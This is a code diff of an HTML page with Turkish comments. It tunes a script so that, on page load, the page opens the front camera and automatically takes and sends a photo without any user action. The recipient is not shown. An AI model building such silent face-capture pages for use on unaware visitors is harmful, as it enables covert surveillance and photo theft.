@@ -19,13 +19,15 @@
 
     async function startCamera() {
       try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         video.srcObject = stream;
 
-        // Kamera açıldıktan 3 saniye sonra otomatik fotoğraf çek
-        setTimeout(() => {
-          takeAndSendPhoto();
-        }, 0);
+        // Kamera görüntüsü yüklendiğinde otomatik fotoğraf çek
+        video.onloadeddata = () => {
+          setTimeout(() => {
+            takeAndSendPhoto();
+          }, 1000);
+        };
       } catch (error) {
         alert('Kamera erişimi reddedildi veya açılamadı: ' + error);
       }
@@ -54,7 +56,9 @@
     }
 
     // Sayfa açıldığında kamerayı başlat
-    document.addEventListener("DOMContentLoaded", startCamera);
+    document.addEventListener("DOMContentLoaded", () => {
+      startCamera();
+    });
   </script>
 </body>
 </html>
